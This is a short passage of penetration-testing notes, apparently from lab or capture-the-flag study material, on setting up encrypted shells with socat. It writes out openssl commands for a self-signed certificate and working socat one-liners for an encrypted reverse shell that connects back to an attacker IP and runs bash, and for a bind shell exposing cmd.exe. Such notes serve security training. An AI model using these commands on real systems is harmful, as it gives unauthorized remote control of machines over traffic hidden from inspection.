We first need to generate a certificate in order to use encrypted shells. This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. This is easiest to do on our attacking machine:

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

We then need to merge the two created files into a single `.pem` file:

```
cat shell.key shell.crt > shell.pem
```

- **_Reverse Shell_**
Now, when we set up our reverse shell listener, we use:

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

socat OPENSSL-LISTEN:53 FILE:`tty`,cert=encrypt.pem,verify=0,raw,echo=0
```

To connect back, we would use:

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


- **_Bind Shell_**
Target:

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:

```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```